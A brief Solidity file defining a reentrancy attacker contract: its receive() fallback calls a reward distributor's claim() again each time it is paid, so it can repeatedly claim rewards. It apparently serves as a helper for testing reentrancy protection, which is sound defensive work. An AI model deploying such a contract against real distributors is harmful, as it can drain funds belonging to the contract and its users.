// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IRewardDistributor {
    function claim() external;
}

contract ReentrantClaimer {
    IRewardDistributor public immutable distributor;

    constructor(IRewardDistributor target) {
        distributor = target;
    }

    function attack() external {
        distributor.claim();
    }

    receive() external payable {
        distributor.claim();
    }
}
